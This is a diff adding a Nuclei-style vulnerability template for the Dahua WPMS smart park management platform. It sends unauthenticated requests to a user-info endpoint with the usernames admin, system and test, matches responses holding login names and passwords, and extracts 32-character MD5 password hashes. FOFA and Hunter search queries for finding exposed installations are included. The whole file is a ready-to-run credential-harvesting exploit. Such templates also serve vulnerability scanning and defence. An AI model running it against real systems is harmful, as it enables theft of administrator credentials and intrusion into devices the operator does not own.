@@ -1,0 +1,48 @@
+http:
+    - attack: batteringram
+      extractors:
+        - part: body
+          regex:
+            - '[A-Z0-9a-z]{32}'
+          type: regex
+      matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - loginName
+            - loginPass
+            - isAdmOnline
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      payloads:
+        key:
+            - admin
+            - system
+            - test
+      raw:
+        - |
+          GET /admin/user_getUserInfoByUserName.action?userName={{key}} HTTP/1.1
+          Host: {{Hostname}}
+          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+          Accept-Encoding: gzip, deflate
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+id: dahua-wpms-getuserinfobyusername-infoleak
+info:
+    author: hufei
+    description: |
+        获取登录用户以及md5加密后的密码
+    metadata:
+        fofa-query: app="大华-智慧园区综合管理平台"
+        hunter-query: app.name="Dahua 大华 智慧园区管理平台"
+        max-request: 1
+        verified: true
+    name: 大华-WPMS
+    reference: https://github.com/PeiQi0/PeiQi-WIKI-Book/tree/main/docs/wiki/iot/%E5%A4%A7%E5%8D%8E
+    severity: high
+    tags:
+        - dahua
+        - wpms
+        - infoleak
